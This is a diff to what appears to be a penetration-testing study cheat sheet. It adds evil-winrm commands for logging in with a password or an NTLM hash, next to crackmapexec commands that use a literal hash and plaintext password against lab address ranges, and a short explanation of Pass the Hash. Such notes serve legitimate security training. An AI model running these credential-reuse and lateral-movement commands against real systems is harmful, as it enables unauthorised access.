@@ -2085,6 +2085,10 @@ crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exe
 ````
 proxychains crackmapexec winrm 172.16.138.10-83 -u users.txt -p Mushroom! -d MEDTECH.COM -x whoami
 ````
+````
+evil-winrm -u <user> -p <password> -i 172.16.138.83
+evil-winrm -u <user> -H <hash> -i 172.16.138.83
+````
 #### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
 The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
 ##### third party cheat sheet
